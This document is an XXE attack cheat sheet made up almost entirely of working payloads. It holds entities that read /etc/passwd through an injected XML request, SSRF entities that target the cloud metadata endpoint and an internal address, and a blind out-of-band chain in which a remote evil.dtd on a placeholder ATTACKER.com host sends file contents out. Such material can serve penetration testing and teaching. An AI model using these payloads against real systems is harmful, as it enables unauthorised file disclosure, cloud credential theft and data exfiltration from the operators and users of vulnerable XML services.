```
<!DOCTYPE foo [<!ENTITY xxe "test">]>
<foo>&xxe;</foo>
```
```
<!--?xml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

Just for refrence where accept the XMl =>  vulnerability occurs because the XML parser resolves external entities without proper restrictions
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```
Converted to THis ---|>
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
--------------------------------------------------------------
Exploiting XXE to perform SSRF attacks
Cloud internal meta-data
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://192.168.1.1:80/"> ]>
```
-------------------------------------------------------------------
Blind XXE to SSRF
When responses aren't shown, use out-of-band (OOB) techniques:
```
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER.com/evil.dtd">
  %dtd;
]>
```
evil.dtd on attacker server:
```
<!ENTITY % exfil SYSTEM "http://ATTACKER.com/exfil?data=%file;">
%exfil;
```
--------------------------------------------------------------






